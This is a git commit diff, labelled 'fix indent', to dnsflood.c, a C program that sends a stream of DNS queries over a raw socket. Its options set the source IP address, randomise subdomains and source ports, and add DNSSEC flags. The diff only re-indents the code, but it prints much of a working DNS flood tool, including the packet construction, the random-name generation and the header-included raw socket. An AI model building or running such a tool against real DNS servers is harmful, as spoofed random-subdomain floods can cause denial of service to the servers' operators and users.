129a158bacc075630bb9ea6433c2c7ea5603bd61
arash <arash.cordi@gmail.com>
2020-07-11 20:17:24 +0430

    fix indent

--- dnsflood.c
+++ dnsflood.c
@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <string.h>
 
- #include <arpa/inet.h>
+#include <arpa/inet.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -43,7 +43,7 @@ enum dns_type {
 
 typedef struct type_name{
 	uint16_t type;
-    char typename[8];
+	char typename[8];
 } type_name_t;
 
 type_name_t dns_type_names [] = {
@@ -191,110 +191,110 @@ void usage(char *progname)
  */
 char *randomLabel(size_t len, char *rLabel)
 {
-    const static char validChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-";
-    size_t charsetLen = sizeof validChars - 1;
-    size_t letterLen = sizeof validChars - 12;
-    size_t letdigLen = sizeof validChars - 2;
-    size_t n;
+	const static char validChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-";
+	size_t charsetLen = sizeof validChars - 1;
+	size_t letterLen = sizeof validChars - 12;
+	size_t letdigLen = sizeof validChars - 2;
+	size_t n;
 
 #ifdef DEBUG
-    if (len > 63 || len < 1) {
-        printf("Invalid label length: %d.\nLabels must be 63 characters or less.\n", (int)len);
-        exit(1);
-    }
+	if (len > 63 || len < 1) {
+		printf("Invalid label length: %d.\nLabels must be 63 characters or less.\n", (int)len);
+		exit(1);
+	}
 #endif
 
-    if (rLabel) {
-        // They must start with a letter.
-        rLabel[0] = validChars[random() % letterLen];
-        // and have as interior characters only letters, digits, and hyphen.
-        for (n = 1; n < (len - 1); n++) {
-            rLabel[n] = validChars[random() % charsetLen];
-        }
-        // end with a letter or digit
-        if (n < len)
-            rLabel[n] = validChars[random() % letdigLen];
+	if (rLabel) {
+		// They must start with a letter.
+		rLabel[0] = validChars[random() % letterLen];
+		// and have as interior characters only letters, digits, and hyphen.
+		for (n = 1; n < (len - 1); n++) {
+			rLabel[n] = validChars[random() % charsetLen];
+		}
+		// end with a letter or digit
+		if (n < len)
+			rLabel[n] = validChars[random() % letdigLen];
 
-        rLabel[len] = '\0';
+		rLabel[len] = '\0';
 
 #ifdef DEBUG
-        printf("Label: %02d %s\n", (int)strlen(rLabel), rLabel);
+		printf("Label: %02d %s\n", (int)strlen(rLabel), rLabel);
 #endif
 
-    }
-    return rLabel;
+	}
+	return rLabel;
 }
 
 void randomName(int len, int label_cnt, char *rName)
 {
-    int i;
+	int i;
 
-    label_cnt += (random() % (len / 64 + 1)) + 1;
+	label_cnt += (random() % (len / 64 + 1)) + 1;
 #ifdef DEBUG
-    printf("LabelCnt: %d\n", label_cnt);
+	printf("LabelCnt: %d\n", label_cnt);
 #endif
-    for (i = 0; i < label_cnt && len > 1; i++) {
-        if (len > 63)
-            randomLabel((random() % 63) + 1, rName);
-        else
-            randomLabel((random() % len) + 1, rName);
-        strcat(rName, ".");
-        len -= strlen(rName);
-        rName += strlen(rName);
-    }
+	for (i = 0; i < label_cnt && len > 1; i++) {
+		if (len > 63)
+			randomLabel((random() % 63) + 1, rName);
+		else
+			randomLabel((random() % len) + 1, rName);
+		strcat(rName, ".");
+		len -= strlen(rName);
+		rName += strlen(rName);
+	}
 }
 
 void randomAddr(char *addr)
 {
-    uint32_t rAddr = random();
+	uint32_t rAddr = random();
 
-    addr += snprintf(addr, 5, "%d.", (int)((rAddr >> 24 & 0xFD) + 1));
-    addr += snprintf(addr, 5, "%d.", (int)(rAddr >> 16 & 0xFF));
-    addr += snprintf(addr, 5, "%d.", (int)(rAddr >> 8 & 0xFF));
-    snprintf(addr, 4, "%d", (int)((rAddr & 0xFD) + 1));
+	addr += snprintf(addr, 5, "%d.", (int)((rAddr >> 24 & 0xFD) + 1));
+	addr += snprintf(addr, 5, "%d.", (int)(rAddr >> 16 & 0xFF));
+	addr += snprintf(addr, 5, "%d.", (int)(rAddr >> 8 & 0xFF));
+	snprintf(addr, 4, "%d", (int)((rAddr & 0xFD) + 1));
 }
 
 void nameformat(char *name, char *target)
 {
-    // max label length is 63, plus 1 byte of length, plus 1 byte '\0'
-    char fullname[255];
-    char *bungle = fullname;
-    char *x = NULL;
-    int cpLen;
+	// max label length is 63, plus 1 byte of length, plus 1 byte '\0'
+	char fullname[255];
+	char *bungle = fullname;
+	char *x = NULL;
+	int cpLen;
 
-    *target = 0;
+	*target = 0;
 	strcpy(bungle, name);
 	x = strtok(bungle, ".");
 	while (x != NULL) {
-        cpLen = snprintf(target, 65, "%c%s", (int)strlen(x), x);
-        if (cpLen >= 65) {
+		cpLen = snprintf(target, 65, "%c%s", (int)strlen(x), x);
+		if (cpLen >= 65) {
 			puts("String overflow.");
 #ifdef DEBUG
-            printf("cpLen: %d, Len: %d, inStr: %s, cpStr: %s\n", cpLen, (int)strlen(x), x, target);
+			printf("cpLen: %d, Len: %d, inStr: %s, cpStr: %s\n", cpLen, (int)strlen(x), x, target);
 #endif
 			exit(1);
 		}
-        target += cpLen;
+		target += cpLen;
 		x = strtok(NULL, ".");
 	}
 }
 
 void nameformatIP(char *ip, char *target)
 {
-    char *comps[8];
-    char fullptr[32];
-    char *pbungle = fullptr;
-    char *x = NULL;
-    char ina[] = "in-addr";
-    char end[] = "arpa";
+	char *comps[8];
+	char fullptr[32];
+	char *pbungle = fullptr;
+	char *x = NULL;
+	char ina[] = "in-addr";
+	char end[] = "arpa";
 	int px = 0;
-    int cpLen;
+	int cpLen;
 
-    *target = 0;
-    strcpy(pbungle, ip);
-    x = strtok(pbungle, ".");
+	*target = 0;
+	strcpy(pbungle, ip);
+	x = strtok(pbungle, ".");
 	while (x != NULL) {
-        if (px >= 4) {
+		if (px >= 4) {
 			puts("Force DUMP:: dumbass, wtf you think this is, IPV6?");
 			exit(1);
 		}
@@ -303,33 +303,33 @@ void nameformatIP(char *ip, char *target)
 	}
 
 	for (px--; px >= 0; px--) {
-        cpLen = snprintf(target, 5, "%c%s", (int)strlen(comps[px]), comps[px]);
-        if (cpLen >= 5) {
-            puts("Invalid IP Address.");
+		cpLen = snprintf(target, 5, "%c%s", (int)strlen(comps[px]), comps[px]);
+		if (cpLen >= 5) {
+			puts("Invalid IP Address.");
 #ifdef DEBUG
-            printf("cpLen: %d, Len: %d, inStr: %s, cpStr: %s\n", cpLen, (int)strlen(comps[px]), comps[px], target);
+			printf("cpLen: %d, Len: %d, inStr: %s, cpStr: %s\n", cpLen, (int)strlen(comps[px]), comps[px], target);
 #endif
-            exit(1);
+			exit(1);
+		}
+		target += cpLen;
 	}
-        target += cpLen;
-    }
 
-    target += snprintf(target, sizeof(ina) + 2, "%c%s", (int)strlen(ina), ina);
-    snprintf(target, sizeof(end) + 2, "%c%s", (int)strlen(end), end);
+	target += snprintf(target, sizeof(ina) + 2, "%c%s", (int)strlen(ina), ina);
+	snprintf(target, sizeof(end) + 2, "%c%s", (int)strlen(end), end);
 }
 
 int make_question_packet(char *data, char *name, int type)
 {
-    if(type == TYPE_PTR)
-        nameformatIP(name, data);
-    else
-        nameformat(name, data);
+	if(type == TYPE_PTR)
+		nameformatIP(name, data);
+	else
+		nameformat(name, data);
 
-    *((u_short *) (data + strlen(data) + 1)) = htons(type);
+	*((u_short *) (data + strlen(data) + 1)) = htons(type);
 
-    *((u_short *) (data + strlen(data) + 3)) = htons(CLASS_INET);
+	*((u_short *) (data + strlen(data) + 3)) = htons(CLASS_INET);
 
-    return (strlen(data) + 5);
+	return (strlen(data) + 5);
 }
 
 int make_dnssec_packet(struct dnshdr *dns_header, char *opt_data)
@@ -345,30 +345,30 @@ int make_dnssec_packet(struct dnshdr *dns_header, char *opt_data)
 
 int read_ip_from_file(char *filename)
 {
-    return 0;
+	return 0;
 }
 
 void urandom_init() {
-    unsigned long mySeed;
-    unsigned long *buf = &mySeed;
-    int urandom_fd = open("/dev/urandom", O_RDONLY);
+	unsigned long mySeed;
+	unsigned long *buf = &mySeed;
+	int urandom_fd = open("/dev/urandom", O_RDONLY);
 
-    if (urandom_fd >= 0) {
-        ssize_t result = read(urandom_fd, buf, sizeof(long));
-        if (result < 0)
-            mySeed = 0x4a6f6273;
-    } else {
-        mySeed = 0x4a6f6273;
-    }
-    srandom((unsigned long) time(NULL) * getpid() + mySeed);
+	if (urandom_fd >= 0) {
+		ssize_t result = read(urandom_fd, buf, sizeof(long));
+		if (result < 0)
+			mySeed = 0x4a6f6273;
+	} else {
+		mySeed = 0x4a6f6273;
+	}
+	srandom((unsigned long) time(NULL) * getpid() + mySeed);
 }
 
 
 static int stop = 0;
 
 void term(int signum) {
-    printf("Stopping.. \n");
-    stop = 1;
+	printf("Stopping.. \n");
+	stop = 1;
 }
 
 int main(int argc, char **argv)
@@ -390,7 +390,7 @@ int main(int argc, char **argv)
 	int sleep_interval = 0;	/* interval (in microseconds) between two packets */
 	int dnssec = 0;
 
-        int src_opt = -2;
+	int src_opt = -2;
 	int random_ip = 0;
 	int random_sub = 0;
 	int static_ip = 0;
@@ -419,89 +419,89 @@ int main(int argc, char **argv)
 	int quit = 0;
 	const int on = 1;
 
-    //char *from, *to, filename;
-    //int itmp = 0;
+	//char *from, *to, filename;
+	//int itmp = 0;
 
-    unsigned char packet[1500] = { 0 };
+	unsigned char packet[1500] = { 0 };
 	struct ip *iphdr;
 	struct udphdr *udp;
 	struct dnshdr *dns_header;
 	char *dns_data;
 
-    // Initial random seed
-    urandom_init();
+	// Initial random seed
+	urandom_init();
 
-    while ((arg_options = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
+	while ((arg_options = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
 
 		switch (arg_options) {
 
-		case 'p':
-			dst_port = atoi(optarg);
-			break;
+			case 'p':
+				dst_port = atoi(optarg);
+				break;
 
-		case 'P':
-            src_opt = atoi(optarg);
-            if (src_opt >= 0)
-                src_port = src_opt;
-            else if (src_opt < -1)
-                src_opt = -2;
-			break;
+			case 'P':
+				src_opt = atoi(optarg);
+				if (src_opt >= 0)
+					src_port = src_opt;
+				else if (src_opt < -1)
+					src_opt = -2;
+				break;
 
-		case 'i':
-			sleep_interval = atoi(optarg);
-			break;
+			case 'i':
+				sleep_interval = atoi(optarg);
+				break;
 
-		case 'n':
-			number = atoi(optarg);
-			break;
+			case 'n':
+				number = atoi(optarg);
+				break;
 
-		case 'd':
-			duration = atoi(optarg);
-			break;
+			case 'd':
+				duration = atoi(optarg);
+				break;
 
-		case 'r':
-			random_ip = 1;
-			srandom((unsigned long)time(NULL));
-			break;
+			case 'r':
+				random_ip = 1;
+				srandom((unsigned long)time(NULL));
+				break;
 
-		case 'R':
-			random_sub = 1;
-			break;
+			case 'R':
+				random_sub = 1;
+				break;
 
-		case 'D':
-			//TODO
-			break;
+			case 'D':
+				//TODO
+				break;
 
-		case 'S':
-			dnssec = 1;
-			break;
+			case 'S':
+				dnssec = 1;
+				break;
 
-		case 'f':
-			if (read_ip_from_file(optarg)) {
-			}
-			break;
+			case 'f':
+				if (read_ip_from_file(optarg)) {
+				}
+				break;
 
-		case 's':
-            //static_ip = 1;
-			inet_pton(AF_INET, optarg, &src_ip);
-			break;
+			case 's':
+				//static_ip = 1;
+				inet_pton(AF_INET, optarg, &src_ip);
+				break;
 
-		case 't':
-			qtype = get_type(optarg);
-			if (qtype == 0) {
-				printf("bad query type\n");
-				quit = 1;
-			}
-			break;
+			case 't':
+				qtype = get_type(optarg);
+				if (qtype == 0) {
+					printf("bad query type\n");
+					quit = 1;
+				}
+				break;
 
-		case 'h':
-			usage(argv[0]);
-			return 0;
-			break;
+			case 'h':
+				usage(argv[0]);
+				return 0;
+				break;
 
-		default:
-			printf("CMD line Options Error\n\n");
-			break;
+			default:
+				printf("CMD line Options Error\n\n");
+				break;
 		}
 	}
 
@@ -539,7 +539,7 @@ int main(int argc, char **argv)
 	}
 
 	if ((setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)))
-		== -1) {
+			== -1) {
 		perror("setsockopt");
 		exit(-1);
 	}
@@ -574,9 +574,9 @@ int main(int argc, char **argv)
 
 	/* Set signal handler */
 	memset(&action, 0, sizeof(struct sigaction));
-        action.sa_handler = term;
-        sigaction(SIGTERM, &action, NULL);
-        sigaction(SIGINT, &action, NULL);
+	action.sa_handler = term;
+	sigaction(SIGTERM, &action, NULL);
+	sigaction(SIGINT, &action, NULL);
 
 	time(&start_t);
 	time(&end_t);
@@ -595,7 +595,7 @@ int main(int argc, char **argv)
 		dns_header->id = random();
 		if (random_sub) {
 			if (qtype == TYPE_PTR)
-        		        randomAddr(r);
+				randomAddr(r);
 			else
 				randomName(255 - strlen(qname), 0, r);
 			//printf("b: %s\n", qname);
@@ -615,17 +615,17 @@ int main(int argc, char **argv)
 		udp_datalen = sizeof(struct dnshdr) + dns_datalen;
 		ip_datalen = sizeof(struct udphdr) + udp_datalen;
 
-        // update UDP header 
-        if (src_opt == -2) {
-            // By default - Comply with RFC6056 - Ephemeral port should in range: 1024~65535 
-            udp->uh_sport = htons((random() % (65536 - 1024)) + 1024);
-        } else if (src_opt == -1) {
-            // As you want, will set Ephemeral port range to 0~65535 
-            udp->uh_sport = htons(random() % 65536);
+		// update UDP header 
+		if (src_opt == -2) {
+			// By default - Comply with RFC6056 - Ephemeral port should in range: 1024~65535 
+			udp->uh_sport = htons((random() % (65536 - 1024)) + 1024);
+		} else if (src_opt == -1) {
+			// As you want, will set Ephemeral port range to 0~65535 
+			udp->uh_sport = htons(random() % 65536);
 		}
 
 #ifdef DEBUG
-        printf("Src_opt: %d,\tudp_sport: %u\n", src_opt, ntohs(udp->uh_sport));
+		printf("Src_opt: %d,\tudp_sport: %u\n", src_opt, ntohs(udp->uh_sport));
 #endif
 
 		udp->uh_ulen = htons(sizeof(struct udphdr) + udp_datalen);
